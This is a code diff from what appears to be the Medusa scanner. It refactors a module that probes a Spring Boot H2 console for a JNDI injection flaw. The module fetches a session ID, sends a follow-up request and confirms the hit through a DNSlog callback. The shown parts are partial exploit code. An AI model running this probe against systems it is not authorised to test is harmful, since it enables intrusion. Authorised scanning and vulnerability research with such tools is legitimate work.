@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 __author__ = 'Ascotbe'
-from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Proxies,Dnslog
+from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Dnslog
 import re
 import urllib3
 import requests
@@ -24,19 +24,14 @@ class VulnerabilityInfo(object):
         self.info['details'] = Medusa  # 结果
 
 
-def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
-    proxies=Proxies().result(proxies)
-    scheme, url, port = UrlProcessing().result(Url)
-    if port is None and scheme == 'https':
-        port = 443
-    elif port is None and scheme == 'http':
-        port = 80
-    else:
-        port = port
+def medusa(**kwargs)->None:
+    url = kwargs.get("Url")  # 获取传入的url参数
+    Headers = kwargs.get("Headers")  # 获取传入的头文件
+    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
     try:
 
         payload ="/h2-console/login.do?jsessionid="
-        payload_url = scheme + "://" + url + ":" + str(port) + payload+"ad3ae393781ccf8d7abf0345aa88e398"
+        payload_url = url + payload+"ad3ae393781ccf8d7abf0345aa88e398"
         jsession = requests.get(payload_url, timeout=5,proxies=proxies, verify=False, headers=Headers, )
         global pgroups
         preg = re.compile(r"login\.jsp\?jsessionid=(.*?)'", re.S)
@@ -45,7 +40,7 @@ def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
             preg = re.compile(r"admin\.do\?jsessionid=(.*?)\"", re.S)
             pgroups = re.findall(preg, jsession.text)
 
-        payload_url2 = scheme + "://" + url + ":" + str(port) + payload +pgroups[0]
+        payload_url2 = url+ payload +pgroups[0]
 
         Headers2=Headers
         Headers2['Content-Type']='application/x-www-form-urlencoded'
@@ -58,7 +53,7 @@ def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
         if DL.result():
             Medusa = "{}存在SpringBootH2数据库JNDI注入漏洞\r\n验证数据:\r\n返回内容:{}\r\nDnsLog:{}\r\nDnsLog数据:{}\r\n".format(url,resp.text,DL.dns_host(),str(DL.dns_text()))
             _t = VulnerabilityInfo(Medusa)
-            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
+            VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
             WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
